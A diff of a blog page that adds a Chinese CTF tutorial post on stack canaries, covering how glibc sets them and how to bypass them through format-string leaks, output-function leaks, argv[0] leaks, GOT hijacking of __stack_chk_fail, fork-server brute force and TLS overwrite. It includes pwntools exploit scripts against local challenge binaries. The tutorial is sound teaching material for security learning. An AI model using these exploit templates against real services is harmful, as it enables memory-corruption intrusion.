@@ -156,6 +156,142 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/04/pwn%E7%A9%BFcanary/" class="post-title-link" itemprop="url">pwn穿canary</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-16 18:48:35" itemprop="dateModified" datetime="2022-03-16T18:48:35+08:00">2022-03-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
+<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
+<hr>
+<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
+<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
+<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
+<p>​        //这个图的上面是高地址，下面是低地址</p>
+<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
+<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
+<p><strong>在gcc中使用canary：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
+<p>可以计算出偏移为“17”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
+<p>​        //通常把gdb和终端结合起来看效果更好</p>
+<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
+<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
+<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
+<p>当canary被覆盖时，程序会进行上述报错</p>
+<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
+<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
+<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
+<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
+<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
+<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
+<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
+<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
+<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
+<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
+<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
+<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
+<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
+<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
+<p>该结构体如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
+<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
+<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2931,221 +3067,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/07/%E5%A0%86-UAF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/07/%E5%A0%86-UAF/" class="post-title-link" itemprop="url">堆+UAF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-12-07 08:51:14" itemprop="dateCreated datePublished" datetime="2021-12-07T08:51:14+08:00">2021-12-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-01-10 12:48:23" itemprop="dateModified" datetime="2022-01-10T12:48:23+08:00">2022-01-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
